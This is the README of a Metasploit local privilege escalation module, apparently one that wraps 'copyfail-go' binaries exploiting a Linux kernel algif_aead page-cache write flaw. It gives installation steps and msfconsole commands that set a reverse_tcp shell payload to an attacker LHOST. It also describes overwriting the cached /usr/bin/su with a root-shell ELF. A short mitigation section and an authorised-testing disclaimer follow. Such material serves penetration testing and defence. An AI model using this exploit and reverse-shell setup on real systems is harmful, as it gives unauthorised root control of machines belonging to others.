# CopyFail-Go — Metasploit Module

> **Linux Local Privilege Escalation** — `algif_aead` splice page-cache write primitive  
> Kernel range: ~5.x → present (unpatched)

---

## Overview

**CopyFail** is a Linux kernel page-cache write primitive vulnerability located in the `algif_aead` crypto API module. It allows an unprivileged user to overwrite the page cache of read-only files.

This repository contains a **Metasploit Framework module** (`copyfail_lpe.rb`) that executes the [copyfail-go](https://github.com/badsectorlabs/copyfail-go) precompiled binaries to gain root access.

### Why Precompiled Binaries?
This module takes a **"local-first, compiler-less"** approach:
1. It does **not** require `gcc` or any compiler on the target machine.
2. The binaries are bundled inside the `data/` directory. **No internet access is required** on the target or attacker machine at exploit time.
3. It supports multiple architectures natively: `x86_64`, `i386`, `arm64`, and `armv7`.
4. All binaries are verified against strict SHA256 hashes before being staged to the target.

---

## Repository Layout

```
copyfail-msf/
├── copyfail_lpe.rb      # Metasploit module (this project)
├── data/                # Bundled copyfail-go precompiled binaries
│   ├── copyfail-go_Linux_x86_64
│   ├── copyfail-go_Linux_i386
│   ├── copyfail-go_Linux_arm64
│   └── copyfail-go_Linux_armv7
└── README.md            # This file
```

---

## Installation

```bash
# 1. Clone this repository (binaries already included in data/)
git clone https://github.com/TheSysRat/copyfail-msf.git
cd copyfail-msf

# 2. Copy files to your MSF local modules directory
mkdir -p ~/.msf4/modules/exploits/linux/local/copyfail/
cp copyfail_lpe.rb ~/.msf4/modules/exploits/linux/local/copyfail/
cp -r data/        ~/.msf4/modules/exploits/linux/local/copyfail/

# 3. Reload modules inside msfconsole
msf6 > reload_all
```

---

## Usage

```
msf6 > use exploit/linux/local/copyfail/copyfail_lpe
msf6 exploit(...) > set SESSION 1
msf6 exploit(...) > set PAYLOAD linux/x64/shell/reverse_tcp
msf6 exploit(...) > set LHOST 10.10.10.10
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > run
```

### Targets

You can manually force a specific architecture if the auto-detection (`uname -m`) fails or if you are targeting a specific environment.

```
msf6 exploit(...) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Auto (CopyFail-Go)
   1   Linux x64
   2   Linux x86
   3   Linux aarch64
   4   Linux armle
```

To force a 32-bit x86 payload and binary:
```
msf6 exploit(...) > set TARGET 2
msf6 exploit(...) > set PAYLOAD linux/x86/shell/reverse_tcp
```

### Module Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `SESSION` | Integer | — | **Required.** Existing low-privilege session |
| `WritableDir` | String | `/tmp` | Staging directory on the target |
| `Cleanup` | Boolean | `true` | Drop page cache + delete staged files |
| `CopyfailDownload` | Boolean | `false` | Fallback: download from GitHub Releases if not found in `data/` |
| `CopyfailLocalBin` | String | *(blank)* | Override: explicit path to a specific binary on the attacker machine |

---

## ⚠️ Page Cache Cleanup

After exploitation, the kernel page cache for `/usr/bin/su` is contaminated with the root-shell ELF.

**The module runs cleanup automatically** (`Cleanup=true`).  
If the module is interrupted, you must manually run this **on the target**:

```bash
echo 3 > /proc/sys/vm/drop_caches
```

---

## Mitigation (for defenders)

Apply your distribution's kernel update. As a temporary workaround, disable the `algif_aead` module:

```bash
sh -c "printf 'install algif_aead /bin/false\n' > /etc/modprobe.d/copyfail.conf; rmmod algif_aead 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
```

---

## Credits

| Role | Person |
|------|--------|
| Original Go Implementation | [badsectorlabs](https://github.com/badsectorlabs) |
| Metasploit module | TheSysRat |

> **This module is provided for authorised penetration testing and security research only.**
